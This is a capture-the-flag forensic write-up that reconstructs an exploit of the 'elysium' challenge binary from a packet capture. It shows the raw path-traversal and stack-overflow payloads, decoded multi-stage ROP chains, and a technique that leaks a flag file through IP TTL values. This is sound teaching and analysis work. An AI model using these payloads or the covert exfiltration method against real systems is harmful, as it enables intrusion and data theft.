# Insomni'hack CTF 2015: Elysium Ropchain

**Category:** Forensic
**Solves:** 1
**Description:** 

> This task is a mix between memory exploitation and forensic...
> 
> Most of you exploited the elysium binaries in an elegant way during the Teaser !
> But we want to understand what did the real exploit from the movie.
> Please find the attached pcap and binaries
> 
> WARNING ! The flag format is not respected in this task. Don't worry, it's still a little l33T sentence (I just forgot to put INS{} around it).
> Author : agix - Difficulty : hard

This task has also been proposed in Sthack CTF 2015.

## Write-up

We’re given a `TAR.GZ` archive containing the following files:

```
$ tar tvfz elysium_ropchain_analysis.tar.gz 
drwxr-xr-x agix/agix         0 2015-02-17 17:51 forensic/
-rwxr-xr-x agix/agix   1758972 2014-11-18 14:25 forensic/libc.so.6
-rwxr-xr-x agix/agix     22427 2015-02-17 17:39 forensic/elysium
-rw-rw-r-- agix/agix     26868 2015-02-17 17:51 forensic/elysium_ropchain_analysis.pcap
```

The goal is to study the PCAP file to understand how the elysium binary has been exploited.

### Studying the elysium binary

The elysium binary listens on a port passed as a parameter, and calls the handle_client() function for each new connection.

This function first generates a random number of different kinds of units, then generates 16 random bytes, sends them to the client, winitializes AES cipher and sends a welcome message:

```
.text:00001EBB loc_1EBB:                               ; CODE XREF: handle_client+77
.text:00001EBB                 mov     dword ptr [esp], 0 ; timer
.text:00001EC2                 call    _time
.text:00001EC7                 mov     [esp], eax      ; seed
.text:00001ECA                 call    _srand
.text:00001ECF                 call    generate_units
.text:00001ED4                 mov     dword ptr [esp+4], 10h
.text:00001EDC                 lea     eax, [ebp+buf]
.text:00001EE2                 mov     [esp], eax
.text:00001EE5                 call    _RAND_pseudo_bytes
.text:00001EEA                 mov     dword ptr [esp+0Ch], 0 ; flags
.text:00001EF2                 mov     dword ptr [esp+8], 10h ; n
.text:00001EFA                 lea     eax, [ebp+buf]
.text:00001F00                 mov     [esp+4], eax    ; buf
.text:00001F04                 mov     eax, [ebp+socket_fd]
.text:00001F07                 mov     [esp], eax      ; fd
.text:00001F0A                 call    _send
.text:00001F0F                 lea     eax, [ebp+var_128]
.text:00001F15                 mov     [esp+8], eax
.text:00001F19                 lea     eax, [ebp+aes_info]
.text:00001F1F                 mov     [esp+4], eax
.text:00001F23                 lea     eax, [ebp+buf]
.text:00001F29                 mov     [esp], eax
.text:00001F2C                 call    aes_init
.text:00001F31                 lea     eax, [ebp+aes_info]
.text:00001F37                 mov     [esp+4], eax    ; int
.text:00001F3B                 mov     eax, [ebp+socket_fd]
.text:00001F3E                 mov     [esp], eax      ; fd
.text:00001F41                 call    send_welcome
.text:00001F46                 jmp     loc_2251
```

The AES generation uses the 16 random bytes as an IV, and a fixed key "Elysium_Military": 
```
.text:00001136                 mov     [ebp+key], 'sylE'
.text:0000113D                 mov     [ebp+var_14], '_mui'
.text:00001144                 mov     [ebp+var_10], 'iliM'
.text:0000114B                 mov     [ebp+var_C], 'yrat'
.text:00001152                 mov     eax, [ebp+arg_4]
.text:00001155                 mov     [esp], eax
.text:00001158                 call    _EVP_CIPHER_CTX_init
```

We can then notice that all the communications between the binary and connected clients are ciphered with AES-128-CBC using these parameters. The format of the packets is:

```
| Size 4B | Encrypted data |
```

Therefore, we can start writting a script to decrypt the communications contained in the PCAP file.

### Decryption

Here is the dirty script used for decryption:

```
#!/usr/bin/python

from scapy.all import *
import struct
from Crypto.Cipher import AES

key="Elysium_Military"
datasz=0
a=rdpcap("elysium.pcap")
randbits=""
chunk=""
for pkt in a:
    if pkt.haslayer('Raw'):
        if randbits=="":
            randbits=str(pkt['Raw'])
            aesCiph = AES.new(key, AES.MODE_CBC, randbits)
        else:
            data=str(pkt['Raw'])
            while len(data)>0:
                if datasz == 0:
                    datasz = struct.unpack("<L",data[:4])[0]
                    saved_datasz = datasz
                    data=data[4:]
                if len(data) > 4:
                    chunk += data[:datasz]
                    if len(chunk) == saved_datasz:
                        print "====== FROM",pkt['IP'].src,"======"
                        aesCiph = AES.new(key, AES.MODE_CBC, randbits)
                        chunkok = aesCiph.decrypt(chunk)
                        print chunkok
                        chunk = ""
                        data = data[datasz:]
                        datasz = 0
                    else:
                        datasz = datasz - len(chunk)
                        data = ""
```

The output seems concluding:

```
====== FROM 54.76.18.92 ======
Armadyne robots controller
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
21ed4c7af50d987589a9029fc0422151be3a0fc2:2
====== FROM 54.76.18.92 ======
Total units : 4658
Medical units : 900
Military units : 220
Social units : 249
Spy units : 91
Shield units : 646
Communication units : 921
Transport units : 807
Computer units : 824
Available units : 3534
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
ad627891fd066f3a7c9b613b99c5c0f9c473e7f9:1 ../../../../../../../../proc/self/maps
====== FROM 54.76.18.92 ======
b7422000-b7424000 rw-p 00000000 00:00 0 
b7424000-b7427000 r-xp 00000000 ca:01 132831     /lib/i386-linux-gnu/libdl-2.19.so
b7427000-b7428000 r--p 00002000 ca:01 132831     /lib/i386-linux-gnu/libdl-2.19.so
b7428000-b7429000 rw-p 00003000 ca:01 132831     /lib/i386-linux-gnu/libdl-2.19.so
b7429000-b75d2000 r-xp 00000000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d2000-b75d3000 ---p 001a9000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d3000-b75d5000 r--p 001a9000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d5000-b75d6000 rw-p 001ab000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d6000-b75d9000 rw-p 00000000 00:00 0 
b75d9000-b776c000 r-xp 00000000 ca:01 147354     /lib/i386-linux-gnu/libcrypto.so.1.0.0
b776c000-b777b000 r--p 00193000 ca:01 147354     /lib/i386-linux-gnu/libcrypto.so.1.0.0
b777b000-b7782000 rw-p 001a2000 ca:01 147354     /lib/i386-linux-gnu/libcrypto.so.1.0.0
b7782000-b7785000 rw-p 00000000 00:00 0 
b7789000-b778a000 rw-p 00000000 00:00 0 
b778a000-b778f000 rw-p 00000000 00:00 0 
b778f000-b7790000 r-xp 00000000 00:00 0          [vdso]
b7790000-b77b0000 r-xp 00000000 ca:01 132812     /lib/i386-linux-gnu/ld-2.19.so
b77b0000-b77b1000 r--p 0001f000 ca:01 132812     /lib/i386-linux-gnu/ld-2.19.so
b77b1000-b77b2000 rw-p 00020000 ca:01 132812     /lib/i386-linux-gnu/ld-2.19.so
b77b2000-b77b5000 r-xp 00000000 ca:01 395831     /home/esylium/elysium
b77b5000-b77b6000 r--p 00003000 ca:01 395831     /home/esylium/elysium
b77b6000-b77b7000 rw-p 00004000 ca:01 395831     /home/esylium/elysium
b7f1c000-b7f3d000 rw-p 00000000 00:00 0          [heap]
bf83f000-bf860000 rw-p 00000000 00:00 0          [stack]
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
00f93c8d7327a2f19ec277ed4493e44f94b1110c:3 -900
====== FROM 54.76.18.92 ======
Medical units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
3848db24cfcb2d1e9ba1f551a77bf385da5418a1:4 -204
====== FROM 54.76.18.92 ======
Military units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
cfe9e2f47c968aebefc9318128cc581d29d2b044:5 -249
====== FROM 54.76.18.92 ======
Social units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
a8bfb3e65077e83aeafc5c3da6a1f5dfee4edbc9:6 -75
====== FROM 54.76.18.92 ======
Spy units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
9129a95677dd38e1fe4c03f51c9e5e35485d0c6b:7 -646
====== FROM 54.76.18.92 ======
Shield units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
8da7fda503ec0d9a406601af56bbd4880567658d:8 -905
====== FROM 54.76.18.92 ======
Communication units addedTransport units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
dc166ae1e47988d1113e788891329d3ce205c5e2:9 -807
====== FROM 54.76.18.92 ======
Transport units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
736f3551379c27d05df59d85738b54bbf06b6387:a -808
====== FROM 54.76.18.92 ======
Computer units added
====== FROM 54.76.18.92 ======
1) Get informations <name>
2) List units
3) Add medical units <count>
4) Add military units <count>
5) Add social units <count>
6) Add spy units <count>
7) Add shields units <count>
8) Add communication units <count>
9) Add transport units <count>
a) Add computer units <count>
*) Exit
====== FROM 192.168.79.67 ======
7eba53cc457d0025af33e998dd5e642016c7f41f_3Aba
8Ab9Ac0Ac1Ac2Ac3aaaa
[...]
```

### Traffic study

Let's explain a bit the traffic: when data is received by the binary, it is splitted according to a ':' character using sscanf():
```
.text:000017D1                 mov     eax, [ebp+cmd]
.text:000017D4                 mov     [esp+0Ch], eax
.text:000017D8                 lea     eax, [ebp+sha1_recvd]
.text:000017DB                 mov     [esp+8], eax
.text:000017DF                 lea     eax, (asc_27DE - 4000h)[ebx] ; "%[^:]:%[^\n]"
.text:000017E5                 mov     [esp+4], eax    ; format
.text:000017E9                 mov     eax, [ebp+s]
.text:000017EC                 mov     [esp], eax      ; s
.text:000017EF                 call    _sscanf
```

First part is a SHA1 hash, which should correspond to the SHA1 of the second part, which is a command number. There is also an obvious buffer overflow allowing to overwrite past a stack buffer (#VULN1).

Looking at the decrypted traffic, we first notice the exploitation of a second vulnerability (VULN#2) in the "Get Informations" command handler (number 1). This is a path traversal vulnerability, allowing the attacker to retrieve "/proc/self/maps" file to defeat ASLR by knowing where the binary and the libraries are mapped in memory.
```
====== FROM 192.168.79.67 ======
ad627891fd066f3a7c9b613b99c5c0f9c473e7f9:1 ../../../../../../../../proc/self/maps
====== FROM 54.76.18.92 ======
b7422000-b7424000 rw-p 00000000 00:00 0 
b7424000-b7427000 r-xp 00000000 ca:01 132831     /lib/i386-linux-gnu/libdl-2.19.so
b7427000-b7428000 r--p 00002000 ca:01 132831     /lib/i386-linux-gnu/libdl-2.19.so
b7428000-b7429000 rw-p 00003000 ca:01 132831     /lib/i386-linux-gnu/libdl-2.19.so
b7429000-b75d2000 r-xp 00000000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d2000-b75d3000 ---p 001a9000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d3000-b75d5000 r--p 001a9000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d5000-b75d6000 rw-p 001ab000 ca:01 132822     /lib/i386-linux-gnu/libc-2.19.so
b75d6000-b75d9000 rw-p 00000000 00:00 0 
b75d9000-b776c000 r-xp 00000000 ca:01 147354     /lib/i386-linux-gnu/libcrypto.so.1.0.0
b776c000-b777b000 r--p 00193000 ca:01 147354     /lib/i386-linux-gnu/libcrypto.so.1.0.0
b777b000-b7782000 rw-p 001a2000 ca:01 147354     /lib/i386-linux-gnu/libcrypto.so.1.0.0
b7782000-b7785000 rw-p 00000000 00:00 0 
b7789000-b778a000 rw-p 00000000 00:00 0 
b778a000-b778f000 rw-p 00000000 00:00 0 
b778f000-b7790000 r-xp 00000000 00:00 0          [vdso]
b7790000-b77b0000 r-xp 00000000 ca:01 132812     /lib/i386-linux-gnu/ld-2.19.so
b77b0000-b77b1000 r--p 0001f000 ca:01 132812     /lib/i386-linux-gnu/ld-2.19.so
b77b1000-b77b2000 rw-p 00020000 ca:01 132812     /lib/i386-linux-gnu/ld-2.19.so
b77b2000-b77b5000 r-xp 00000000 ca:01 395831     /home/esylium/elysium
b77b5000-b77b6000 r--p 00003000 ca:01 395831     /home/esylium/elysium
b77b6000-b77b7000 rw-p 00004000 ca:01 395831     /home/esylium/elysium
b7f1c000-b7f3d000 rw-p 00000000 00:00 0          [heap]
bf83f000-bf860000 rw-p 00000000 00:00 0          [stack]
```

We then observe several commands to change the amount of various units types. It seems that another vulnerability is exploited here: it is possible to pass negative integers, and thus decrease the amount of units (VULN#3).
The amount of units are stored in an array of integers starting at 0x00004100 (symbol units).
At the beginning, we notice the following memory configuration:
```
.data:00004100 units           dd 900
.data:00004104 dword_4104      dd 220
.data:00004108 dword_4108      dd 249
.data:0000410C dword_410C      dd 91
.data:00004110 dword_4110      dd 646
.data:00004114 dword_4114      dd 921
.data:00004118 dword_4118      dd 807
.data:0000411C dword_411C      dd 824
```

After the various decreases, we have:
```
.data:00004100 units           dd 0
.data:00004104 dword_4104      dd 16
.data:00004108 dword_4108      dd 0
.data:0000410C dword_410C      dd 16
.data:00004110 dword_4110      dd 0
.data:00004114 dword_4114      dd 16
.data:00004118 dword_4118      dd 0
.data:0000411C dword_411C      dd 16
```

We don't know yet why the attacker need this particular layout.

The last command sent by the attacker tries to exploit the buffer overflow identified earlier (VULN#1). The overflow is triggered by the sscanf call, which will copy an arbitrary amount of bytes to the stack location which should contain the SHA1 part. However, there are two heap pointers located just after the SHA1 buffer, and they are freed before the function returns, which mean that the attacker will have to make these pointers valid, or a crash will occur.

Here is the data sent by the attacker:
```
7eba53cc457d0025af33e998dd5e642016c7f41f_3Aba\x08a{\xb7\x10a{\xb78Ab9Ac0Ac1Ac2Ac3aaaa\xda5W\xb7c5Ac0a{\xb7Ac8AQ\x90Q\xb7`cbadcba\x88GV\xb7(7Q\xb7Q\x90Q\xb7@bbadcba\x88GV\xb7\x99UT\xb7Q\x90Q\xb7 d{\xb7#d{\xb7\x88GV\xb7\xa1SQ\xb7agixscrtoseffuuu\xdd\xcb\\\xb7 d{\xb7
```

The stack layout of the cipher_recv function after the overflow is:
```
sha1_recvd= byte ptr -45h	=> SHA1 + "_"
buf= byte ptr -1Ch		=> 0x61624133
ptr1= dword ptr -18h		=> 0xb77b6108
ptr2= dword ptr -14h		=> 0xb77b6110
var_10= dword ptr -10h		=> 0x39624138
cmd= dword ptr -0Ch		=> 0x41306341
???				=> 0x63413163
???				=> 0x33634132
SAVED_EBP			=> 0x61616161
SAVED_EIP			=> 0xb75735da
```

We can see that the two heap pointers have a valid address. According to the /proc/self/maps file leaked earlier, we see that these addresses respectively point to units+0x8 and units+0x10. We now understand the meaning of the decreases: the attacker built a fake heap with 4 8-bytes chunks, so that the calls to free() do not make the program crash.

Now, it's time to study the ROP chain ...

### ROP Chain

The libc.so.6 and the elysium binary being provided, we can resolve each address of the ROP chain. Once an address has been resolved, it is added to a dictionary, and a Python script shows us a "pretty" rop chain:
```
#!/usr/bin/python

import struct

resolved = {
    0xb75735da: "pop esi ; pop edi ; pop ebp ; ret",
    0xb7519051: "pop ecx ; pop eax; ret",
    0xb7564788: "sub eax,ecx ; ret",
    0xb7513728: "xchg ebx,eax ; ret",
    0xb7545599: "mov edx,eax ; mov eax,edx ; ret",
    0xb75153a1: "int 0x80 ; pop ebp ; pop edi ; pop esi ; pop ebx ; ret",
    0xb75ccbdd: "pop esp ; ret",
}

rop_chain = "da3557b76335416330617bb741633841519051b76063626164636261884756b7283751b7519051b74062626164636261884756b7995554b7519051b720647bb723647bb7884756b7a15351b761676978736372746f73656666757575ddcb5cb720647bb7".decode("hex")

while len(rop_chain)>4:
    value = struct.unpack("<L",rop_chain[:4])[0]
    comment = ""
    if value in resolved:
        comment = resolved[value]
    print hex(value) + "\t" + comment
    rop_chain = rop_chain[4:]
```

The output is (comments have been added for better comprehension):
```
$ python elrop.py
0xb75735da	pop esi ; pop edi ; pop ebp ; ret
0x63413563	
0xb77b6130	
0x41386341	
0xb7519051	pop ecx ; pop eax; ret
0x61626360	
0x61626364	
0xb7564788	sub eax,ecx ; ret			# EAX = 4
0xb7513728	xchg ebx,eax ; ret			# EBX = 4
0xb7519051	pop ecx ; pop eax; ret
0x61626240	
0x61626364	
0xb7564788	sub eax,ecx ; ret			# EAX = 0x124
0xb7545599	mov edx,eax ; mov eax,edx ; ret		# EDX = 0x124
0xb7519051	pop ecx ; pop eax; ret
0xb77b6420	
0xb77b6423	
0xb7564788	sub eax,ecx ; ret			# EAX = 0x3 ; ECX = 0xb77b6420
0xb75153a1	int 0x80 ; pop ; pop ; pop ; pop ; ret	# SYSCALL => read(4, 0xb77b6420, 0x124)
0x78696761	
0x74726373	
0x6665736f	
0x75757566	
0xb75ccbdd	pop esp ; ret				# ESP = 0xb77b6420
0xb77b6420
```

This ROP chain reads 0x124 bytes on the socket and stores them @0xb77b6420. Then the stack is shifted to point to 0xb77b6420. We thus understand that a second ROP chain has been sent to the server.

We can retrieve these 0x124 bytes and repeat the decoding operation:
```
$ python elrop.py
0xb74a7b90	memfrob()
0xb7519051	pop ecx ; pop eax; ret
0xb77b6430	
0x114	
0x9d7b22aa	
0x9d6c08dd	
0x391d2a2a	
0x2a2a0a2a	
[...]
```

It seems we only have 4 valid gadgets, and then garbage. However, there is a call to memfrob, with parameters 0xb77b6430 and 0x114. 0xb77b6430 is the beginning of the second ROP chain plus 0x10, and 0x114 is the size minus 0x10. memfrob(void *ptr, size_t n) is a fonction to XOR each byte of a memory range with 42! We thus have to apply the same decoding to the rest of our ROP chain:
```
0xb74a7b90	memfrob()
0xb7519051	pop ecx ; pop eax; ret
0xb77b6430	
0x114	
0xb7510880	mmap()					# mmap @ 0x13370000, size 0x2000
0xb74622f7	add esp,0x1c ; ret
0x13370000	
0x2000	
0x3	
0x31	
0x0	
0x0	
0x78696761	
0xb7516bb0	recv()					# recv(4, 0x13370000, 0x1e)
0xb74622f7	add esp,0x1c ; ret
0x4	
0x13370000	
0x1e	
0x0	
0x78696761	
0x78696761	
0x78696761	
0xb74a7b90	memfrob()				# memfrob(0x13370000, 0x1e)
0xb7519051	pop ecx ; pop eax; ret
0x13370000	
0x1e	
0xb7504020	open()					# open(0x13370018, 0, 0)
0xb75735da	pop esi ; pop edi ; pop ebp ; ret
0x13370018	
0x0	
0x0	
0xb75044b0	read()					# read(0, 0x13370100, 0x20)
0xb75735da	pop esi ; pop edi ; pop ebp ; ret
0x0	
0x13370100	
0x20	
0xb7504db0	close()					# close(0)
0xb7519051	pop ecx ; pop eax; ret
0x0	
0x78696761	
0xb74ded90	sleep()					# sleep(1)
0xb7519051	pop ecx ; pop eax; ret
0x1	
0x78696761	
0xb753da40	cbc_crypt()				# cbc_crypt(0x13370000, 0x13370100, 0x20, 0x2, 0x13370008)
0xb74622f7	add esp,0x1c ; ret
0x13370000	
0x13370100	
0x20	
0x2	
0x13370008	
0x78696761	
0x78696761	
0xb7516bb0	recv()					# recv(0x4, 0x13371000, 0xaf8)
0xb74622f7	add esp,0x1c ; ret
0x4	
0x13371000	
0xaf8	
0x0	
0x78696761	
0x78696761	
0x78696761	
0xb753da40	cbc_crypt()				# cbc_crypt(0x13370000, 0x13371000, 0xaf8, 0x3, 0x13370010)
0xb74622f7	add esp,0x1c ; ret
0x13370000	
0x13371000	
0xaf8	
0x3	
0x13370010	
0x78696761	
0x78696761	
0xb75ccbdd	pop esp ; ret
0x13371000	
```

This second ROP chain does many interesting things:
- reserves 0x2000 bytes of memory @0x13370000
- reads 0x1e bytes on the socket, and XOR them via memfrob()
- opens and reads 0x20 bytes of a file @0x13370100
- ciphers this content using cbc_crypt() using DES with key @0x13370000 and IV @0x13370008
- reads 0xaf8 bytes on the socket @0x13371000
- deciphers this content using cbc_crypt() using DES with key @0x13370000 and IV @0x13370010
- shifts the stack to @0x13371000

We understand that the next 0x1e bytes sent to the socket, when XORed with 42, should follow the following structure:
```
struct info {
	unsigned char key[8];
	unsigned char IV1[8];
	unsigned char IV2[8];
	char filename[6];
}
```

Lets decode these bytes:
```
>>> ''.join(chr(ord(k)^42) for k in data)
'&4\x08,\x08\x0e\x08\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/flag\x00'

struct info {
	unsigned char key[8] = "&4\x08,\x08\x0e\x08\x1c";
	unsigned char IV1[8] = "\0\0\0\0\0\0\0\0";
	unsigned char IV2[8] = "\0\0\0\0\0\0\0\0";
	char filename[6] = "/flag";
}
```

Bingo! We're close. We know that the "/flag" file content (32 bytes) has been written to 0x13370100, and DES ciphered.

It's now time to study the third (and hopefully last) ROP chain :)
For this, we need a small script to use DES_CBC on the 0xaf8 bytes sent:
```

#!/usr/bin/python

from Crypto.Cipher import DES

key ="\x26\x34\x08\x2c\x08\x0e\x08\x1c"
mydes = DES.new(key, DES.MODE_CBC, '\0'*8)
open("ropchain3","wb").write(mydes.decrypt(open("ciphered_bytes","rb").read()))

```

Once we have the cleartext ROP chain, we can analyze it:
```
0xb7516eb0      setsockopt()
0xb74622f7      add esp,0x1c ; ret
0x4     
0x0     
0x2     
0x13370100      
0x1     
0x78696761      
0x78696761      
0xb7516d30      send()
0xb74622f7      add esp,0x1c ; ret
0x4     
0xb77b2000      
0x100   
0x0     
0x78696761      
0x78696761      
0x78696761      
0xb74ded90      sleep()
0xb7519051      pop ecx ; pop eax; ret
0x1     
0x78696761      
0xb7516eb0      setsockopt()
0xb74622f7      add esp,0x1c ; ret
0x4     
0x0     
0x2     
0x13370101      
0x1     
0x78696761      
0x78696761      
0xb7516d30      send()
0xb74622f7      add esp,0x1c ; ret
0x4     
0xb77b213b      
0xc5    
0x0     
0x78696761      
0x78696761      
0x78696761      
0xb74ded90      sleep()
0xb7519051      pop ecx ; pop eax; ret
0x1     
0x78696761      
0xb7516eb0      setsockopt()
0xb74622f7      add esp,0x1c ; ret
0x4     
0x0     
0x2     
0x13370102      
0x1     
0x78696761      
0x78696761      
0xb7516d30      send()
0xb74622f7      add esp,0x1c ; ret
0x4     
0xb77b21a5      
0xd7    
0x0     
0x78696761      
0x78696761      
0x78696761      
0xb74ded90      sleep()
[...]
```
The chain is quite big, but we can clearly identify a pattern which is repeated for each byte of the ciphered flag:
- setsockopt(4, 0, 2, flag_ciphered[i], 1)
- send(4, arbitrary_elf_address, arbitrary_size)

The Flag is sent ciphered, byte by byte, in the TTL field of the IP segment of TCP packets containing arbitrary content from the beginning of the program in memory (we can see the ELF header etc. in wireshark).

All we have to do, one may think, is retrieving these bytes and applying the decipher!
```
#!/usr/bin/python

from Crypto.Cipher import DES

key ="\x26\x34\x08\x2c\x08\x0e\x08\x1c"
flag = "\xef\x9f\x77\xe2\xc9\x7c\xe9\xab\x47\xe6\x7f\x5a\x4d\x50\x18\xa6\x27\xb4\x83\x3e\x2e\xcc\xb1\x12\x8e\x12\xe9\x77\xad\x63\xc0\x87"
mydes = DES.new(key, DES.MODE_CBC, '\0'*8)
print mydes.decrypt(flag)


$ python cbc.py
�MO�
    S3J��%e��3�L+�}�8�C��oN>�

```

Humm ... This does not look like a flag ...

After many frustrations, I thought that the TTL field should have been decreased in transit if the capture has been done on the attacker's machine! We just have to try increasing each byte of the ciphered flag, until we find a flag:
```
#!/usr/bin/python

from Crypto.Cipher import DES
import string

key ="\x26\x34\x08\x2c\x08\x0e\x08\x1c"
flag = "\xef\x9f\x77\xe2\xc9\x7c\xe9\xab\x47\xe6\x7f\x5a\x4d\x50\x18\xa6\x27\xb4\x83\x3e\x2e\xcc\xb1\x12\x8e\x12\xe9\x77\xad\x63\xc0\x87"

for x in xrange(256):
    zout=''.join( chr((ord(k)+x)&0xff) for k in flag )

    mydes = DES.new(key, DES.MODE_CBC, '\0'*8)
    clear = mydes.decrypt(zout)
    if all(ord(c) < 127 and c in string.printable for c in clear.strip("\x00")):
        print x,clear
```

And magic happens:
```
$ python cbc.py
10 In_D0ubt_reb0ot
```

## Other write-ups and resources

* none yet
